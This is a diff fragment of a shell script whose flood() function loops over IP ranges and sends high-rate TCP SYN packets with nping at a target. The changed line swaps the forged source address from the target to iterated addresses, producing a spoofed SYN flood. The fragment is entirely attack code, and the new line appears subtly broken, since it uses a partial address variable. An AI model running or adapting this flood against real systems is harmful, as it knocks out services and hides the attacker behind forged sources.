@@ -17,7 +17,7 @@ flood() {
     for j in $i.{0..255}; do
       for k in $j.{0..255}; do
         for l in $k.{0..255}; do
-          nping -c 1 --rate 90000 --tcp --flags SYN -S $target -g $port $target
+          nping -c 1 --rate 90000 --tcp --flags SYN -S $k -g $port $target
         done
       done
     done
